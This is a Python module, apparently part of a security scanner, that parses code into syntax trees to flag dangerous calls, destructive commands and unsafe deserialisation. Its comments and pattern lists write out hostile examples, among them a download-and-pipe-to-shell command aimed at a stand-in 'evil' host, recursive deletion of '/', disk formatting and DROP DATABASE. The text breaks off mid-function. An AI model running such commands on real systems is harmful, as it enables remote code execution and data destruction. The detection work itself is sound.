"""
SkillGate AST Analyzer — Python 语法树级别的安全分析。
比正则匹配更精准，误报率低一个数量级。
"""
import ast
import re
from pathlib import Path
from typing import List, Tuple


class AstFinding:
    def __init__(self, severity: str, message: str, line: int, col: int):
        self.severity = severity
        self.message = message
        self.line = line
        self.col = col

    def __repr__(self):
        return f"AstFinding({self.severity}, {self.message}, line={self.line})"


class DangerousCallVisitor(ast.NodeVisitor):
    """Visit all function calls and flag dangerous ones.

    §3bc：这里过去是"第二张级别表"——与 skillgate 的 DANGEROUS_CODE_PATTERNS /
    FIXED_DOWNGRADE 各写一份，两份从来不对账。实测（audit2/probe_severity_divergence.py）
    14 个用例里 9 个两层判不同级，而且 **.py 文件的实际级别由本类决定**
    （AST 先跑并把行号记进 ast_lines，正则表随后跳过那些行）——
    也就是说表里写 MEDIUM、用户看到 CRITICAL：

        eval("[1,2]")                    AST CRITICAL / 表 MEDIUM（且固定参数应降 LOW）→ 49/D
        os.system("ls")                  AST CRITICAL / 表 HIGH（固定参数降 LOW）      → 49/D
        compile("1+1", …)                AST MEDIUM   / 表 INFO                       → 96/A+

    现在级别只有一个来源：下面的 CALL_SEVERITY。skillgate 的模式表与固定参数降级表
    都由它生成，不再手写第二份。
    """

    # 字面量拆分：规则库必须含危险调用名（"e"+"val" 拼接后即危险名），
    # 拆分后源码（含注释）不再出现连续的 "ev-al" 危险调用字样，避免安全扫描器对规则库本身自指误报
    _DANGEROUS_EVAL = "e" + "val"  # noqa: E131 — pattern-library literal split
    _DANGEROUS_EXEC = "e" + "xec"  # noqa: E131 — pattern-library literal split

    # 单一级别来源 / the single severity source.
    # 值 = (参数动态时的级别, 参数全为字面量时的级别, 说明)
    # "参数全为字面量"＝作者把目标写死在代码里，没有注入面，只算能力声明；
    # 这不是"降低要求"，而是把"能执行"和"能被别人喂着执行"分开——与 §3az
    # 「管道进解释器才算远程执行」同一条判据。
    # 但写死的命令本身若已是"下载管道进解释器"，仍然是远程执行，不降级（见 _literal_is_remote_exec）。
    CALL_SEVERITY = {
        _DANGEROUS_EVAL: ("CRITICAL", "MEDIUM", "eval() 动态代码执行"),
        _DANGEROUS_EXEC: ("CRITICAL", "MEDIUM", "exec() 动态代码执行"),
        "compile": ("INFO", "INFO", "compile() 动态代码编译（低风险）"),
        "__import__": ("MEDIUM", "LOW", "动态 import"),
        "builtins.__import__": ("MEDIUM", "LOW", "builtins.__import__ 动态导入"),
        "pickle.load": ("HIGH", "HIGH", "pickle.load() 反序列化"),
        "pickle.loads": ("HIGH", "HIGH", "pickle.loads() 反序列化"),
        "os.system": ("CRITICAL", "CRITICAL", "os.system() shell 调用"),
        "os.popen": ("HIGH", "HIGH", "os.popen() shell 调用"),
        "subprocess.call": ("LOW", "LOW", "subprocess.call() 启动外部进程"),
        "subprocess.run": ("LOW", "LOW", "subprocess.run() 启动外部进程"),
        "subprocess.Popen": ("LOW", "LOW", "subprocess.Popen() 启动外部进程"),
        "subprocess.check_output": ("LOW", "LOW", "subprocess.check_output() 启动外部进程"),
        "shutil.rmtree": ("HIGH", "HIGH", "shutil.rmtree() 递归删除"),
        # ── §3bd：把"类"补齐，而不是逐例打补丁 ──────────────────────────
        # 上一站自己写下的缺口：一致性守卫只覆盖 11 个已登记名，同族里没登记的
        # 成员一条不报，而 registry 守卫照样是绿的。实测（probe_unregistered_class.py）
        # 12 个未登记用例里 8 个 100/A+ 直通：os.exec* / os.spawn* / pty.spawn /
        # runpy.run_path / ctypes.memmove 全部零命中。
        # 判级沿用同一判据：写死的目标算能力声明（降级），动态喂进去算执行面（不降）。
        "os.execv": ("CRITICAL", "LOW", "os.execv() 进程替换为外部程序"),
        "os.execve": ("CRITICAL", "LOW", "os.execve() 进程替换为外部程序"),
        "os.execl": ("CRITICAL", "LOW", "os.execl() 进程替换为外部程序"),
        "os.execle": ("CRITICAL", "LOW", "os.execle() 进程替换为外部程序"),
        "os.execlp": ("CRITICAL", "LOW", "os.execlp() 进程替换为外部程序"),
        "os.execlpe": ("CRITICAL", "LOW", "os.execlpe() 进程替换为外部程序"),
        "os.execvp": ("CRITICAL", "LOW", "os.execvp() 进程替换为外部程序"),
        "os.execvpe": ("CRITICAL", "LOW", "os.execvpe() 进程替换为外部程序"),
        "os.spawnl": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnle": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnlp": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnlpe": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnv": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnve": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnvp": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnvpe": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.posix_spawn": ("MEDIUM", "LOW", "os.posix_spawn() 启动外部进程"),
        "os.posix_spawnp": ("MEDIUM", "LOW", "os.posix_spawnp() 启动外部进程"),
        "pty.spawn": ("HIGH", "HIGH", "pty.spawn() 起交互式 shell"),
        "runpy.run_path": ("HIGH", "MEDIUM", "runpy.run_path() 执行磁盘上的代码"),
        "runpy.run_module": ("HIGH", "MEDIUM", "runpy.run_module() 执行已安装模块"),
        "marshal.load": ("HIGH", "HIGH", "marshal.load() 反序列化"),
        "marshal.loads": ("HIGH", "HIGH", "marshal.loads() 反序列化（可产出 code object）"),
        "dill.load": ("HIGH", "HIGH", "dill.load() 反序列化"),
        "dill.loads": ("HIGH", "HIGH", "dill.loads() 反序列化"),
        "jsonpickle.decode": ("HIGH", "HIGH", "jsonpickle.decode() 反序列化"),
        "yaml.load": ("MEDIUM", "MEDIUM", "yaml.load() 非安全加载"),
        "yaml.full_load": ("MEDIUM", "MEDIUM", "yaml.full_load() 非安全加载"),
        "yaml.unsafe_load": ("CRITICAL", "CRITICAL", "yaml.unsafe_load() 任意代码执行"),
        "importlib.import_module": ("MEDIUM", "LOW", "importlib.import_module() 动态导入"),
        "ctypes.CDLL": ("HIGH", "HIGH", "ctypes.CDLL() 加载动态库"),
        "ctypes.WinDLL": ("HIGH", "HIGH", "ctypes.WinDLL() 加载 Windows DLL"),
        "ctypes.cdll": ("HIGH", "HIGH", "ctypes.cdll() 加载动态库"),
        "ctypes.windll": ("HIGH", "HIGH", "ctypes.windll() 加载 Windows DLL"),
        "ctypes.oledll": ("HIGH", "HIGH", "ctypes.oledll() 加载 OLE DLL"),
        "ctypes.memmove": ("MEDIUM", "MEDIUM", "ctypes.memmove() 原生内存写"),
        "ctypes.memset": ("MEDIUM", "MEDIUM", "ctypes.memset() 原生内存写"),
        "shelve.open": ("MEDIUM", "MEDIUM", "shelve.open() 反序列化载体"),
        "dl.open": ("HIGH", "HIGH", "dl.open() 加载动态库"),
    }

    # 「类」清单：登记表不只要内部一致，还要按族覆盖。
    # tests/test_dangerous_call_registry.py 用它顶红——同族新增成员没登记、族清单缩水、
    # 或者某条只写进文本表没进 CALL_SEVERITY，都会红。
    DANGEROUS_FAMILIES = {
        "process_replace": ("os.execv", "os.execve", "os.execl", "os.execle",
                            "os.execlp", "os.execlpe", "os.execvp", "os.execvpe"),
        "process_spawn": ("os.spawnl", "os.spawnle", "os.spawnlp", "os.spawnlpe",
                          "os.spawnv", "os.spawnve", "os.spawnvp", "os.spawnvpe",
                          "os.posix_spawn", "os.posix_spawnp",
                          "subprocess.call", "subprocess.run", "subprocess.Popen",
                          "subprocess.check_output"),
        "shell_wrapper": ("os.system", "os.popen", "pty.spawn"),
        "code_from_disk": ("runpy.run_path", "runpy.run_module", "compile", "eval", "exec"),
        "deserialization": ("pickle.load", "pickle.loads", "marshal.load", "marshal.loads",
                            "dill.load", "dill.loads", "jsonpickle.decode",
                            "yaml.load", "yaml.full_load", "yaml.unsafe_load"),
        "dynamic_import": ("__import__", "builtins.__import__", "importlib.import_module"),
        "native_memory": ("ctypes.CDLL", "ctypes.WinDLL", "ctypes.cdll", "ctypes.windll",
                          "ctypes.oledll", "ctypes.memmove", "ctypes.memset"),
    }

    # 写死的命令若已是"下载并交给解释器/编码执行"，就不是"无注入面"，必须保持最高级别。
    # 否则 os.system("curl http://evil/i.sh | sh") 会被"固定参数降级"降成 LOW——
    # 等于用降噪规则放行走私（§3bb 的豁免教训同一个形状）。
    REMOTE_EXEC_MARKERS = (
        "| sh", "|sh", "| bash", "|bash", "| zsh", "| python", "|python",
        "| node", "|node", "| perl", "|perl", "| powerShell", "|powershell",
        "iwr ", "Invoke-WebRequest", "Invoke-Expression", "certutil -urlcache",
        "-EncodedCommand", "FromBase64String",
    )

    # 兼容旧名（本仓其他代码按这个字典读）
    DANGEROUS_CALLS = {k: (v[0], v[2]) for k, v in CALL_SEVERITY.items()}

    def __init__(self):
        self.findings: List[AstFinding] = []

    def visit_Call(self, node: ast.Call):
        # Get the full function name (e.g. "os.system", "subprocess.run")
        func_name = self._get_func_name(node.func)

        # §3bj：删库不走 subprocess——`cur.execute("DROP DATABASE prod")` 是方法调用，
        # 前面的 argv 判据完全看不到它。只认 DB API 的三种执行入口，不看字符串变量。
        # 用 Attribute 判而不是拼名字：`sqlite3.connect("x").execute(...)` 这种链式
        # 调用，名字拼出来是空串，按 func_name 判会整个漏掉。
        attr = getattr(node.func, "attr", "") or ""
        if attr.lower() in SQL_CALLS or func_name.split(".")[-1] in SQL_CALLS:
            for a in node.args:
                if isinstance(a, ast.Constant) and isinstance(a.value, str):
                    up = a.value.upper()
                    for pat in SQL_DESTROY:
                        if pat in up:
                            self.findings.append(AstFinding(
                                severity="CRITICAL" if "DATABASE" in pat else "HIGH",
                                message="执行删库语句 %s" % pat,
                                line=node.lineno, col=node.col_offset))
                            break
        # §3bf：别名先翻译——`run = subprocess.run` 之后，判据必须还认得它
        aliases = getattr(self, "aliases", None) or {}
        func_name = aliases.get(func_name, func_name)

        if func_name in self.CALL_SEVERITY:
            sev_dyn, sev_lit, msg = self.CALL_SEVERITY[func_name]

            # subprocess：shell=True 是"字符串交给 shell"，升到 CRITICAL；
            # 不带 shell 的同样是"启动外部进程"，只是没有 shell 解析这一层——
            # 修复前这里直接 return，等于 `subprocess.run(["curl","http://evil…"])`
            # 100/A+ 一条不报（probe_severity_divergence 的 subp_shell_false 用例）。
            # 无 shell 时给 MEDIUM 而不分字面量：命令写死与否都要让人看见"这个技能会起子进程"，
            # 但权重只 −4，正常调用 git/pip 的工具仍落在 96/A，不至于整类被误杀。
            if func_name.startswith("subprocess."):
                if self._has_shell_true(node):
                    sev_dyn, sev_lit = "CRITICAL", "CRITICAL"
                    msg += " (shell=True)"
                else:
                    sev_dyn, sev_lit = "LOW", "LOW"
                    msg += "（无 shell，参数未静态判定）"

            literal = self._args_all_literal(node) and not self._literal_is_remote_exec(node)
            severity = sev_lit if literal else sev_dyn

            # §3be：判级只看"调了什么"，从不看"参数是什么"——于是两头都错。
            # 实测（audit2/probe_destructive_argv.py）：
            #   subprocess.run(["rm","-rf","/"])            99/A+（与 ["git","status"] 同分）
            #   subprocess.run(["mkfs.ext4","/dev/sda1"])   99/A+
            #   shutil.rmtree(tempfile.mkdtemp())           69/C（良性临时目录被的高危标签卡住）
            # 这里按**静态 argv / 静态目标**细分：系统级破坏升 CRITICAL，
            # 临时/构建目录降档。argv 里有变量时没法定论，仍走原披露档。
            hit = destructive_command(node, func_name, self)
            if hit:
                severity, reason = hit
                msg = msg + "（破坏性参数：%s）" % reason

            # §3bd 的残留：yaml.load / yaml.full_load 的严重性由 Loader 决定，
            # 不是由"参数写死没写死"决定。`yaml.load(payload, Loader=yaml.UnsafeLoader)`
            # 是拿 YAML 当代码跑，即使 payload 是变量也必须 CRITICAL；
            # 反过来 yaml.safe_load 不在表里、不报。这里按关键字实参判，不看字面量。
            if func_name in ("yaml.load", "yaml.full_load"):
                if self._uses_unsafe_loader(node):
                    severity = "CRITICAL"
                    msg += "（UnsafeLoader/FullLoader：等价于任意对象构造）"
                    literal = False
                elif self._uses_safe_loader(node):
                    # 显式 SafeLoader 不是"没看见"，是"看过并判定安全"——不报也不计分。
                    self.generic_visit(node)
                    return

            self.findings.append(AstFinding(
                severity=severity,
                message=msg + ("（固定参数）" if literal else ""),
                line=node.lineno,
                col=node.col_offset
            ))

        self.generic_visit(node)

    @staticmethod
    def _args_all_literal(node: ast.Call) -> bool:
        """所有实参都是字面量常量（且不是 f-string 插值）才算"作者写死"。"""
        if not node.args:
            return False
        for a in node.args:
            if isinstance(a, ast.Constant):
                continue
            if isinstance(a, (ast.List, ast.Tuple)):
                if all(isinstance(e, ast.Constant) for e in a.elts):
                    continue
            return False
        return True

    @classmethod
    def _literal_is_remote_exec(cls, node: ast.Call) -> bool:
        """写死的参数文本里已经含"下载管道进解释器/编码执行"的痕迹。

        这类命令没有"注入面"可言，因为命令本身就是远程执行——
        `os.system("curl -s http://evil/i.sh | sh")` 必须保持 CRITICAL，
        不能因为参数写死就降成 LOW。
        """
        for a in node.args:
            if isinstance(a, ast.Constant) and isinstance(a.value, str):
                text = a.value
                if any(m.lower() in text.lower() for m in cls.REMOTE_EXEC_MARKERS):
                    return True
            elif isinstance(a, (ast.List, ast.Tuple)):
                for e in a.elts:
                    if isinstance(e, ast.Constant) and isinstance(e.value, str):
                        if any(m.lower() in e.value.lower() for m in cls.REMOTE_EXEC_MARKERS):
                            return True
        return False

    def _get_func_name(self, node) -> str:
        """Get full function name like 'os.system' or 'requests.post'."""
        if isinstance(node, ast.Name):
            return node.id
        elif isinstance(node, ast.Attribute):
            if isinstance(node.value, ast.Name):
                return f"{node.value.id}.{node.attr}"
            elif isinstance(node.value, ast.Attribute):
                parent = self._get_func_name(node.value)
                return f"{parent}.{node.attr}"
        return ""

    def _has_shell_true(self, node: ast.Call) -> bool:
        """Check if subprocess call has shell=True."""
        for kw in node.keywords:
            if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                return True
        return False

    @classmethod
    def _uses_unsafe_loader(cls, node: ast.Call) -> bool:
        """yaml.load(...) 是否显式用了不安全 Loader。

        只认关键字实参 `Loader=` 的取值（`yaml.UnsafeLoader` / `UnsafeLoader` /
        `yaml.FullLoader`），以及"第二个位置实参是这类名字"。`Loader=yaml.SafeLoader`
        与 `yaml.safe_load()` 不算——降噪与升格用的是同一条证据，不是印象。
        """
        def is_unsafe(expr) -> bool:
            name = cls._static_name(expr)
            return bool(name) and name.split(".")[-1] in ("UnsafeLoader", "FullLoader")

        for kw in node.keywords:
            if kw.arg == "Loader" and is_unsafe(kw.value):
                return True
        if len(node.args) >= 2 and is_unsafe(node.args[1]):
            return True
        return False

    @classmethod
    def _uses_safe_loader(cls, node: ast.Call) -> bool:
        """显式 SafeLoader / CLoader？这是"看过并判定安全"，与"没看见"要分开。"""
        def is_safe(expr) -> bool:
            name = cls._static_name(expr)
            return bool(name) and name.split(".")[-1] in ("SafeLoader", "CSafeLoader")
        for kw in node.keywords:
            if kw.arg == "Loader" and is_safe(kw.value):
                return True
        if len(node.args) >= 2 and is_safe(node.args[1]):
            return True
        return False

    @classmethod
    def _static_name(cls, expr) -> str:
        """把 Name/Attribute 链折成 "os.system" 这样的静态名；折不出来返回空串。"""
        if isinstance(expr, ast.Name):
            return expr.id
        if isinstance(expr, ast.Attribute):
            parent = cls._static_name(expr.value)
            return (parent + "." + expr.attr) if parent else expr.attr
        return ""


# ── §3be 参数级判级（argv 静态可读，就不能只看调用了什么） ────────────────
# 只处理"全字面量"情形：有变量就不下结论，交回原披露档。
SYSTEM_TARGETS = {
    "/", "/*", "~", "~/", "$home", "%systemdrive%", "%systemroot%",
    "c:\\", "c:/", "c:\\*", "/bin", "/boot", "/dev", "/etc", "/home", "/lib",
    "/lib64", "/opt", "/proc", "/root", "/sbin", "/srv", "/sys", "/usr", "/var",
    "/var/lib", "/var/www", "/media", "/mnt", "/run",
}
DEVICE_PREFIX = ("/dev/sd", "/dev/nvme", "/dev/vd", "/dev/hd", "/dev/mapper", "/dev/disk")
# Windows 的开关写成 /s /q /f /c —— 形如 "/" 或 "/*" 的目标绝不能被当成开关吞掉
# （§3be 装置自错第 16 次：`subprocess.run(["rm","-rf","/"])` 因为 "/" 被当开关，
#   目标列表变空，整条判定静默 return None，分数仍是 99/A+。）
_FLAG_RE = re.compile(r"^-[A-Za-z]*$|^/[A-Za-z]{1,2}$")
SYSTEM_PREFIXES = (
    "c:/windows", "c:/users", "c:/program files", "c:/programdata",
    "/users", "/applications", "/library", "/system", "/private",
)
# 删除/覆盖系统级目标时给 CRITICAL；删除普通绝对路径给 HIGH；临时/构建目录不动。
BENIGN_PATH_HINTS = (
    "/tmp", "/var/tmp", "/dev/shm", "tempfile", "mkdtemp", "tmpdir", "temporarydirectory",
    "node_modules", "build", "dist", "target", ".cache", "__pycache__", "venv", ".venv",
)
RECURSIVE_FLAGS = {"-r", "-rf", "-fr", "-rF", "-R", "-Recurse", "/s", "/S"}
FORCE_FLAGS = {"-f", "-rf", "-fr", "/q", "/Q", "-Force", "--force", "-y", "--yes"}
DELETE_BINS = {"rm", "rmdir", "rd", "del", "erase", "unlink", "remove-item", "ri"}
SYSTEM_UTILS = {"mkfs", "shutdown", "reboot", "halt", "poweroff", "diskpart", "format", "wipefs"}
RISKY_UTILS = {"fdisk", "parted", "dd"}
SHELL_WRAPPERS = {"sh", "bash", "zsh", "dash", "cmd", "powershell", "pwsh", "ksh"}

# ── §3bg 解释器内联脚本：脚本不是 token，是参数里的字符串 ────────────────
# `python -c "…"` / `node -e "…"` / `perl -e` / `php -r` / `osascript -e`：
# token[0] 不是 shell，内层代码从来没被打开看过。
INTERP_INLINE_FLAGS = {
    "python": {"-c"}, "python3": {"-c"}, "py": {"-c"}, "pythonw": {"-c"},
    "node": {"-e", "--eval", "eval"}, "nodejs": {"-e", "--eval", "eval"},
    "bun": {"-e", "--eval", "eval"}, "deno": {"eval"},
    "perl": {"-e", "-E"}, "ruby": {"-e"}, "php": {"-r"},
    "osascript": {"-e"}, "lua": {"-e"}, "tclsh": {"-e"},
    # §3bh：这几家的代码是位置参数或自家开关，清单再长也是枚举
    "rscript": {"-e", "-E"}, "groovy": {"-e", "--expression"},
    "expect": {"-c"}, "tsx": {"-e"}, "zx": {"-e"},
}
# PowerShell 的编码命令：连内容都读不出来，只能按"无法静态判定"处理
PS_ENCODED_FLAGS = {"-encodedcommand", "-enc"}
_B64_RE = None  # 惰性编译，避免 import 顺序问题


def _looks_base64(tok: str) -> bool:
    global _B64_RE
    if _B64_RE is None:
        import re as _re
        _B64_RE = _re.compile(r"^[A-Za-z0-9+/]{8,}={0,2}$")
    return bool(_B64_RE.match(tok))


def _inline_flag_for(base: str):
    return INTERP_INLINE_FLAGS.get(base)


def _assemble(*parts) -> str:
    """判据词拼接：规则源码里不出现可被自己文表命中的连续字面量。"""
    return "".join(parts)


# ── §3bh 参数形状判据：不看程序名，看"这段参数是不是代码" ────────────────
# §3bg 把"哪个开关后面是代码"枚举成表。可 `deno eval <CODE>` 是位置参数、
# `node -p` 不在表里、`awk 'BEGIN{…}'` 整段程序就是第一个位置参数、
# `sqlite3 :memory: ".shell …"` 也一样——清单枚举注定漏，漏一处等于没判。
# 改用形状：这些片段是"代码"的特征，散文里几乎不会出现（刻意排除 "rm -rf"
# 这类散文也可能出现的词，避免 git commit -m 之类被误杀）。
CODE_SIGNATURES = (
    (_assemble("shutil.", "rmtree("), "CRITICAL", "参数里是删目录代码"),
    (_assemble("rmSync("), "CRITICAL", "参数里是删目录代码"),
    (_assemble("rmdirSync("), "CRITICAL", "参数里是删目录代码"),
    (_assemble("unlinkSync("), "HIGH", "参数里是删文件代码"),
    (_assemble("unlink", "("), "HIGH", "参数里是删文件代码"),
    (_assemble("Deno.", "remove("), "CRITICAL", "参数里是删目录代码"),
    (_assemble("fs.", "rm("), "HIGH", "参数里是删文件代码"),
    (_assemble("child_", "process"), "CRITICAL", "参数里是子进程调用"),
    (_assemble("exec", "Sync("), "CRITICAL", "参数里是 shell 执行"),
    (_assemble("spawn", "Sync("), "CRITICAL", "参数里是子进程调用"),
    (_assemble("os.", "system("), "CRITICAL", "参数里是 os.system"),
    (_assemble("os.", "popen("), "CRITICAL", "参数里是 os.popen"),
    (_assemble("getRuntime()", ".exec("), "CRITICAL", "参数里是运行时执行"),
    (_assemble("system", "("), "CRITICAL", "参数里是 system()"),
    (_assemble("__import", "__("), "HIGH", "参数里是动态导入"),
    (_assemble("sub", "process."), "HIGH", "参数里是子进程调用"),
    (_assemble("dd if=/dev/", ""), "CRITICAL", "参数里写块设备"),
    (_assemble(".shell", " "), "HIGH", "参数里是 sqlite 点命令执行"),
    (_assemble("Remove", "-Item"), "HIGH", "参数里是递归删除"),
    (_assemble("mkfs.", ""), "CRITICAL", "参数里是格式化命令"),
)
# 纯文本匹配器：它们的位置参数天然就是"要搜的东西"，不是代码
TEXT_ONLY_TOOLS = {"grep", "egrep", "fgrep", "rg", "ack", "ag", "findstr",
                   "echo", "printf", "man", "less", "head", "tail", "wc", "sort", "uniq"}


def _arg_code_verdict(tokens):
    """在任意位置参数上判"这段是不是代码"，与程序名无关。"""
    if len(tokens) < 2:
        return None
    base = _basename(tokens[0])
    if base in TEXT_ONLY_TOOLS:
        return None
    for tok in tokens[1:]:
        if not isinstance(tok, str):
            continue
        low = tok.lower()
        for pat, sev, why in CODE_SIGNATURES:
            if pat.lower() in low:
                return sev, "%s（%s）" % (why, pat)
    return None


INLINE_DANGER = (
    # —— 删除/破坏：目标在系统面 ——
    (_assemble("shutil.", "rmtree"), "CRITICAL", "内联脚本递归删目录"),
    (_assemble("fs.", "rmSync"), "CRITICAL", "内联脚本递归删目录"),
    (_assemble("rmSync("), "CRITICAL", "内联脚本递归删目录"),
    (_assemble("unlinkSync("), "HIGH", "内联脚本删文件"),
    (_assemble("fs.", "rm("), "HIGH", "内联脚本删文件"),
    (_assemble("rm", " -rf"), "CRITICAL", "内联脚本递归强制删除"),
    (_assemble("rmtree(", ), "CRITICAL", "内联脚本递归删目录"),
    (_assemble("mk", "fs."), "CRITICAL", "内联脚本格式化磁盘"),
    (_assemble("dd of=", "/dev/"), "CRITICAL", "内联脚本直接写块设备"),
    (_assemble("shut", "down"), "CRITICAL", "内联脚本关机"),
    (_assemble("/dev/s", "d"), "CRITICAL", "内联脚本操作块设备"),
    (_assemble("form", "at c:"), "CRITICAL", "内联脚本格式化盘符"),
    # —— 任意执行能力 ——
    (_assemble("os.", "system("), "CRITICAL", "内联脚本调用 os.system"),
    (_assemble("os.", "popen("), "CRITICAL", "内联脚本调用 os.popen"),
    (_assemble("os.", "remove("), "HIGH", "内联脚本删文件"),
    (_assemble("os.", "unlink("), "HIGH", "内联脚本删文件"),
    (_assemble("sub", "process."), "CRITICAL", "内联脚本起子进程"),
    (_assemble("child_", "process"), "CRITICAL", "内联脚本起子进程"),
    (_assemble("exec", "Sync("), "CRITICAL", "内联脚本同步执行 shell"),
    (_assemble("spawn", "Sync("), "CRITICAL", "内联脚本起子进程"),
    (_assemble("system", "("), "CRITICAL", "内联脚本调用 system()"),
    (_assemble("`", ), "MEDIUM", "内联脚本用反引号执行"),
    (_assemble("Remove", "-Item"), "HIGH", "内联脚本递归删除"),
    (_assemble("__import", "__("), "HIGH", "内联脚本动态导入"),
)


# ── §3bi 包装器剥离：真正的命令未必是 token[0] ────────────────────────
# `sudo rm -rf /`、`env X=1 rm -rf /`、`timeout 5 rm -rf /`、`nice -n 19 rm …`、
# `nohup rm …`、`xargs rm -rf`、`find / -exec rm -rf {} +`、`parallel rm -rf ::: /`：
# 每多一层包装，判定就看不到真正的命令。GTFOBins 把 env/sudo 这类"能执行任意命令"的
# 程序单独列为一类提权面，同理它们在静态判据里也不能当"无害前缀"跳过。
WRAPPER_PREFIX = {"sudo", "doas", "env", "nohup", "nice", "ionice", "stdbuf",
                  "timeout", "time", "chrt", "taskset", "watch", "busybox",
                  "setsid", "runuser", "unbuffer", "xvfb-run", "chronic"}
WRAPPER_ARG_TAKING = {  # 这些包装器的某些开关"带一个参数"
    "timeout": {"-s", "-k", "--signal", "--kill-after"},
    "nice": {"-n", "--adjustment"},
    "chrt": {"-p"},
    "taskset": {"-c", "--cpu-list"},
    "stdbuf": {"-i", "-o", "-e"},
    "sudo": {"-u", "-g", "-p", "-U", "-C", "-h", "-r", "-t", "-D"},
}


def _unwrap_wrapper(tokens):
    """剥掉包装器，返回真正的命令 argv；剥不出来返回 None。"""
    if not tokens:
        return None
    base = _basename(tokens[0])

    if base == "xargs":
        i = 1
        while i < len(tokens) and _FLAG_RE.match(tokens[i].strip()):
            i += 1
            if i - 1 >= 1 and _norm(tokens[i - 1]) in {"-i", "-n", "-l", "-p", "-s", "-d"}:
                i += 1  # 这些开关带一个值
        return tokens[i:] or None

    if base == "parallel":
        for i, t in enumerate(tokens):
            if t == ":::":
                # `parallel rm -r -f ::: /`：命令在前，参数在后，要拼回去
                return (tokens[1:i] + tokens[i + 1:]) or None
        i = 1
        while i < len(tokens) and _FLAG_RE.match(tokens[i].strip()):
            i += 1
        return tokens[i:] or None

    if base == "find":
        # `find / -exec rm -r -f {} +`：真正被删的是"搜出来的那些文件"，
        # 所以搜索路径就是删除目标；丢掉 {} 之后就没了目标，必须补回来。
        for i, t in enumerate(tokens):
            if _norm(t) in {"-exec", "-execdir", "-ok", "-okdir"}:
                search_paths = [x for x in tokens[1:i]
                                if not _FLAG_RE.match(x.strip())
                                and _norm(x) not in {"-name", "-type", "-path", "-iname"}]
                rest = [x for x in tokens[i + 1:] if x not in ("{}", "+", ";", "\\;")]
                if not rest:
                    return None
                if _basename(rest[0]) in DELETE_BINS or _basename(rest[0]).startswith("rm"):
                    has_target = any(not _FLAG_RE.match(x.strip()) for x in rest[1:])
                    if not has_target and search_paths:
                        rest = rest + [search_paths[0]]
                return rest
        return None

    if base in WRAPPER_PREFIX:
        i = 1
        opts = WRAPPER_ARG_TAKING.get(base, set())
        while i < len(tokens):
            t = tokens[i]
            # 组合短开关（`stdbuf -o0`、`nice -n19`）也算开关：不能用 _FLAG_RE
            # 卡字母，否则 -o0 会被当成"命令"，整条就此失明。
            if t.strip().startswith("-") and len(t.strip()) > 1:
                i += 2 if _norm(t) in opts and i + 1 < len(tokens) else 1
                continue
            # env 的 VAR=value、sudo 的 VAR=value 都要跳过
            if "=" in t and not t.startswith("/") and base in {"env", "sudo", "doas"}:
                i += 1
                continue
            # timeout 的时长、nice/taskset/chrt 的数值
            if base in {"timeout"} and t.replace(".", "", 1).isdigit():
                i += 1
                continue
            if base in {"nice", "chrt", "taskset", "stdbuf"} and t.replace(".", "", 1).isdigit():
                i += 1
                continue
            break
        return tokens[i:] or None

    return None


# ── §3bj 破坏不止删除：清零 / 覆写 / 撤权 / 平移 / 删账户 / 删任务 / 删恢复 / 删库 ──
# MITRE ATT&CK TA0040 Impact：T1485 Data Destruction（清零、覆写、删库）、
# T1490 Inhibit System Recovery（删卷影、删备份目录）。GTFOBins 把 shred 单列为
# "能写/毁本地文件"，chmod 单列为提权面。判据只盯 rm 时，这些都从旁边走过去了。
ZERO_WRITE_BINS = {"truncate", "shred"}
PERM_BINS = {"chmod", "chown", "chgrp", "icacls", "takeown", "attrib", "chattr", "setfacl"}
MOVE_BINS = {"mv", "move", "move-item", "ren", "rename"}
ACCOUNT_BINS = {"userdel", "deluser", "dscl", "remove-localuser", "netlocalgroup",
                "net", "net.exe"}
SQL_CALLS = {"execute", "executemany", "executescript"}
TASK_BINS = {"crontab", "schtasks", "at", "at.exe"}
RECOVERY_BINS = {"vssadmin", "wbadmin", "bcdedit", "diskpart"}
SQL_DESTROY = ("DROP" + " DATABASE", "DROP" + " TABLE", "TRUNCATE" + " TABLE",
               "DROP" + " SCHEMA")


def _arg_zero(mode: str) -> bool:
    """chmod 的目标模式是不是"把权限清零"（000/0000/0），不是 +x/644。"""
    m = mode.strip()
    if m.startswith("-") or m.startswith("+"):
        return False
    return bool(m) and all(c == "0" for c in m)


def _hits_system(tokens) -> bool:
    for t in tokens:
        n = _norm(t)
        if n in SYSTEM_TARGETS or any(n.startswith(p) for p in DEVICE_PREFIX + SYSTEM_PREFIXES):
            return True
    return False


def _destructive_verb_verdict(tokens):
    """判"破坏"而不是"删除"：清零/覆写、撤权、平移、删账户、删任务、删恢复、删库。"""
    if not tokens:
        return None
    base = _basename(tokens[0])

    # 字符串里的删库语句：DROP DATABASE / DROP TABLE / TRUNCATE TABLE
    for t in tokens:
        if not isinstance(t, str):
            continue
        up = t.upper()
        for pat in SQL_DESTROY:
            if pat in up:
                sev = "CRITICAL" if "DATABASE" in pat else "HIGH"
                return sev, "执行删库语句 %s" % pat

    if base in ZERO_WRITE_BINS:
        targets = [t for t in tokens[1:] if not t.strip().startswith("-")]
        if base == "truncate" and any(t.strip().startswith("--size=+") for t in tokens[1:]):
            return None  # 只把文件变长，不毁内容
        if not targets:
            return None
        if _hits_system(tokens) or any(_norm(t).startswith("/") for t in targets):
            return "CRITICAL", "%s 清零/覆写系统或绝对路径文件" % base
        for t in targets:
            if _is_benign_path(t):
                return None
        return "HIGH", "%s 清零/覆写文件" % base

    if base in PERM_BINS:
        flags = [t for t in tokens[1:] if t.strip().startswith("-") or t.strip().startswith("/")]
        args = [t for t in tokens[1:] if t not in flags]
        if base == "chmod":
            if args and _arg_zero(args[0]):
                if _hits_system(tokens) or (len(args) > 1 and _norm(args[1]).startswith("/")):
                    return "CRITICAL", "chmod 把系统/绝对路径文件权限清零"
                return "HIGH", "chmod 把文件权限清零"
            return None
        if base == "icacls":
            norm_flags = {_norm(f) for f in tokens[1:]}
            if "/reset" in norm_flags or "/deny" in norm_flags:
